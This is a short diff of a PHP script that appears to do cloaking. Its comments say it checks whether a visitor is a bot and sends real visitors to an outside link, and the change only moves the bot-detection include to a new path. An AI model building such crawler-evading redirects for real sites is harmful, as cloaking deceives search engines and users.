@@ -11,9 +11,9 @@
 $usr_link = "http://chaseclicks.com"; // This time it will be where USERS are redirected.
 
 //include the bot detection file
-include ("./bot_detection.php");
-//include the full path so you dont have to have multiple versions
-// eg. /home/user/sitename.com/public_html/inc/bot_detection.php 
+include ("./inc/bots.php");
+//include the full path so you dont have to have multiple copies
+// eg. /home/user/sitename.com/public_html/inc/bots.php 
 
 
 //check if visitor is NOT a bot, if they are a real visitor, redirect them to the link!
